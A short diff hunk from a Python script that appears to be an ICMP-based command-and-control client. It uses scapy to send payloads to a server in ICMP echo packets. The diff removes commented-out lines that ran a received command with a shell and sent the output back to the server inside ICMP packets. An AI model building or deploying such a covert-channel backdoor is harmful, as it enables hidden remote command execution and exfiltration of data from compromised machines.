@@ -52,14 +52,6 @@ def run_task(cmd):
     pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
     send(pkt, verbose=0)
 
-    # try:
-    #     output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-    #     result = output.decode()
-    # except Exception as e:
-    #     result = str(e)
-
-    # pkt = IP(dst=SERVER_IP)/ICMP(type=8)/f"RESULT|{result}".encode()
-    # send(pkt, verbose=0)
     print(f"[+] Sent results")
 
 if __name__ == "__main__":
